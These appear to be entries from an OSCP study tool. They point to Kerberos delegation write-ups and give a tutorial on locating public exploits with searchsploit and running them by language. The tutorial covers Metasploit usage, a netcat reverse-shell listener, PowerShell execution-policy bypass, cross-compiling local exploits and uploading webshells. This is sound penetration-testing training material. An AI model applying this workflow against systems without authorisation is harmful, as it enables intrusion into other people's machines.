An enabled impersonation privilege on the machine is local privilege escalation to SYSTEM. It is the potato case. It does not issue a domain ticket. The privilege list and the other Se* cases are `oscp technique show token-impersonation-privs`.

## Delegation on the service hop
Unconstrained, constrained, and resource-based delegation are the same idea: some account may request tickets as another user. The three configurations are separate write-ups.

    oscp technique show unconstrained-delegation
    oscp technique show constrained-delegation
    oscp technique show resource-based-delegation
    oscp technique show rbcd-attack

## Open next
    oscp technique show kerberos-attacks-map
    oscp technique show impacket-cheatsheet
    oscp atlas impacket-GetNPUsers
    oscp atlas impacket-GetUserSPNs
    oscp atlas rubeus

entries.title: Using public exploits — search, mirror, run by language
entries.brief: searchsploit a version, mirror the Path, and run the file by its extension
entries.body:
## Find it, mirror it, then run it
Work in a directory for that host, search the version, and copy the file you will actually edit.
The Drupal 7 screen is the whole method:
    cd ~/Desktop/TARGET
    searchsploit Drupal 7
    searchsploit -m php/webapps/34992.py
    head -n 40 34992.py
`searchsploit -m` copies that file into the current directory. Edit the copy. The original stays
under `/usr/share/exploitdb/`. `searchsploit -x php/webapps/34992.py` only displays it.
`searchsploit -m 34992` is the same copy, by the number in the filename.

## What the Path column means
The folder is the category. The extension is the language. `php/webapps/34992.py` is a **Python**
program filed under PHP web apps, so you run it with **python3**, not with `php`.
A path containing **remote** or **webapps** is run on Kali, against the target.
A path containing **local** is compiled or copied onto the target and run there.
Skip titles marked **DoS**. A title marked **(PoC)** may only prove the bug.
    searchsploit Drupal 7 --exclude=dos

## Python  .py
    python3 34992.py
    python2 34992.py
The header you printed is the argument list. On current Kali, `python` is Python 3. A
`SyntaxError` on `print` or `except` means the file is Python 2 (`apt install python2`).
An `ImportError` names the missing module (`python3 -m pip install` that name).

## PHP  .php
A client script (it reads arguments, or opens a socket to the target) runs on Kali:
    php exploit.php
A webshell (it expects to be requested over HTTP) is uploaded into the web root, then fetched.
Do not run that file with `php` on Kali and expect a shell. (`apt install php-cli` if `php` is missing.)

## Ruby  .rb
A standalone script:
    ruby exploit.rb
A title marked **(Metasploit)** is not run with `ruby`. Take it into msfconsole:
    searchsploit Drupal 7 | grep -i metasploit
    msfconsole -q
    search type:exploit drupal
    use 0
    set RHOSTS TARGET
    set LHOST LHOST
    run

## Perl  .pl
    perl exploit.pl
A missing `Can't locate X.pm` is a library (`apt install libwww-perl` covers the usual HTTP client).

## Shell  .sh
    bash exploit.sh
    dos2unix exploit.sh
`dos2unix` is for a file that came from Windows and fails when the file has Windows line endings. `chmod +x` if you
want to run it as `./exploit.sh`.

## C and C++  .c .cpp
Remote code is compiled on Kali and the binary runs on Kali. Local code is compiled for the
**target** and runs there (cross-compiling-exploits).
    gcc exploit.c -o exploit && ./exploit
    gcc -static exploit.c -o exploit
    g++ exploit.cpp -o exploit
    i686-w64-mingw32-gcc exploit.c -o exploit.exe
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe

## C#  .cs
    mcs exploit.cs -out:exploit.exe
`mcs` writes a Windows exe. Run that exe on Windows. `mono exploit.exe` runs it on Kali only when
the file is the attacker-side client.

## PowerShell  .ps1
This file runs on the Windows target, not on Kali:
    powershell -ExecutionPolicy Bypass -File .\exploit.ps1

## Java  .java .jar .war
    javac Exploit.java && java Exploit
    java -jar exploit.jar
A `.war` is not a jar you execute. Deploy it through the Tomcat manager (tomcat-exploitation).

## JavaScript  .js
    node exploit.js
If the header says to open it in a browser, it is a page, not a Node program. Serve the directory
and browse to it (`python3 -m http.server`).

## Go  .go
    go build -o exploit exploit.go && ./exploit

## Nmap  .nse
    nmap --script ./exploit.nse -p PORT TARGET

## Upload, or just read
| Ext | What to do |
| --- | --- |
| .asp .aspx .jsp | upload into the web root, then request that URL |
| .exe | run on Windows, and only if `file` says the right arch |
| .html | open in a browser |
| .vbs | cscript on Windows |
| .bat | run on Windows |
| .sql .txt | read it; there is no program to execute |
    cscript //nologo exploit.vbs
    exploit.bat

## The same two commands, other products
Search the exact version, ignore DoS, mirror one Path, run it by the extension above.
    searchsploit wordpress
    searchsploit joomla
    searchsploit tomcat
    searchsploit jenkins
    searchsploit gitlab
    searchsploit apache 2.4.49
    searchsploit samba
    searchsploit openssh
    searchsploit 'linux kernel' 4.15
    searchsploit windows smb

## When the file does not run
Set the target URL, **LHOST**, and **LPORT** to the names the file actually uses. Start a listener
first if the header says reverse shell (`nc -lvnp LPORT`). Then the edits in exploit-modification.
A local kernel exploit is compiled for that box (cross-compiling-exploits), and it can crash it.

## Pattern
"Search the version, mirror the Path, run the extension."
Python, PHP, Ruby, Perl, shell, JavaScript, Go, and Nmap scripts run on Kali. C and C++ are
compiled for the machine that will execute them. PowerShell, C#, exe, vbs, and bat run on Windows.
asp, aspx, jsp, and a PHP webshell are uploaded. A Metasploit row goes to msfconsole.
